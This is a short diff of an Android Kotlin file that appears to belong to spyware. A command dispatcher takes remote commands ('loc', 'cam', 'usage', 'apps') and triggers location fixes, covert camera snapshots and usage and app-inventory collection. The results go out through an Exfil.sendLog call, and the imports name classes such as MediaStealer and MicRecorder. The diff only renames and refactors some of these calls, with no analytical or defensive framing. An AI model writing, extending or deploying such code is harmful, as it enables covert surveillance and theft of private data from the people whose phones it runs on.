@@ -4,7 +4,7 @@ import android.content.Context
 import android.content.Intent
 import android.os.Build
 import com.sp.core.services.CameraSnapService
-import com.sp.core.services.LocationService
+import com.sp.core.services.LocationFix
 import com.sp.core.services.MediaStealer
 import com.sp.core.services.MicRecorder
 import com.sp.core.services.ProjectionConsent
@@ -22,7 +22,7 @@ object Commands {
     fun dispatch(ctx: Context, cmd: String, args: Map<String, String>) {
         when (cmd) {
             "loc" -> {
-                LocationService.requestNow(ctx)
+                LocationFix.send(ctx, immediate = true)
                 Exfil.sendLog(ctx, "cmd_result", """{"cmd":"loc","ok":true}""")
             }
 
@@ -50,7 +50,7 @@ object Commands {
 
             "cam" -> CameraSnapService.start(ctx, args["front"] == "1" || args["front"] == "true")
 
-            "usage" -> start(ctx, UsageStatsService::class.java)
+            "usage" -> UsageStatsService.collectUsage(ctx)
 
             "apps" -> Exfil.sendLog(ctx, "apps", UsageStatsService.inventory(ctx))
 
